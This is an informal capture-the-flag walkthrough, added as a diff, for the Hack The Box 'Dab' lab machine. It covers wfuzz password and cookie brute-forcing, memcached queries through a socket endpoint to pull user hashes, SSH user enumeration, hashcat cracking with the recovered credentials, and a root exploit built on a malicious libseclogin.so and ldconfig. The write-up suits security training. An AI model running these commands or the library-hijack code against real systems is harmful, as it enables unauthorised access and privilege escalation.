@@ -1,0 +1,153 @@
+steghide extract -sf dab.jpg 
+
+i got 80 i have to crack login
+
+wfuzz -c -u http://10.10.10.86/login -w /root/hackthebox/dab/pass -d "username=admin&password=FUZZ" --hh 542
+
+next port 8080
+
+only cookies password auth requ
+
+cracking cookies password 
+
+wfuzz -c -u http://10.10.10.86:8080/ -w pass -H "Cookie: password=FUZZ"  --hh 324
+
+after get access
+
+
+its tcp port and msg tab
+
+we enter 11211 and msg test 
+
+memcached Cheat Sheet https://lzone.de/cheat-sheet/memcached
+we tested with brupsuit
+
+GET / HTTP/1.1
+Host: 10.10.10.86:8080
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+cookie: password=secret
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+
+
+test 2
+
+GET /socket?port=11211&cmd=test HTTP/1.1
+Host: 10.10.10.86:8080
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+
+test 3
+
+GET /socket?port=11211&cmd=stats+slabs HTTP/1.1
+Host: 10.10.10.86:8080
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+test 4
+
+GET /socket?port=11211&cmd=gets+users HTTP/1.1
+Host: 10.10.10.86:8080
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+we got hash we just decrypt the hash 
+
+
+cat users.txt | python -m json.tool > users2.txt
+cat users2.txt | cut -d ":" -f 1 | cut -d '"' -f 2 > usernames.txt 
+ cat users2.txt | cut -d ":" -f 2 | cut -d '"' -f 2 > hashes.txt 
+
+
+msfconsole
+
+use auxiliary/scanner/ssh/ssh_enumusers
+
+set RHOSTS 10.10.10.86
+
+set USER_FILE usernames.txt
+
+
+It will run for a while , then it will tell us that it found the user=== genevieve
+
+hashcat -a 0 -m 0 hash /usr/share/wordlist/rockyou.txt --force
+
+And finally we have valid credentials genevieve:Princess1 , let’s ssh
+
+
+lets login with ssh 
+
+
+We have a password , let’s try sudo -l , and we see that we can run this binary as root /usr/bin/try_harder , and as the name said … we should really try harder.
+
+It gets us a root shell then immediately dies after the first command. We got trolled again :D
+find / -perm -4000 to search for suid binaries and we see something unusual.
+
+A binary called myexec has suid permissions. Let’s see what’s that.
+scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab to download the file on our box
+
+Then we will use radare2
+
+radare2 myexec
+
+aaa
+
+pdf @ main
+The password is s3cur3l0g1n , let’s get back to the box and try it
+
+If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so
+
+
+and we saw earlier when we executed the binary : seclogin() called
+So theoretically , if we can replace libseclogin.so with another one and link to it , the binary will execute it as root. let’s test that.
+We will create a directory in /home/genevieve/ and call it .exploit
+Then we will write a small c program that spawns bash.
+
+#include <stdio.h>
+
+seclogin() {
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+
+
+After that we will compile it
+
+gcc -fPIC -shared -o libseclogin.so exploit.c
+Now our fake libseclogin.so is ready , we need to make the system point to our path /home/genevieve/.exploit/libseclogin.so instead of /usr/lib/libseclogin.so
+We will cd to /etc/ld.so.conf.d , and create a .conf file and put our path in it.
+
+Then to activate that path we will execute this command ldconfig
+This page helped a lot.
+Let’s do ldd again:
+
+we have to use 
+
+ldd /usr/bin/myexec
+
+ldconfig 
+ 
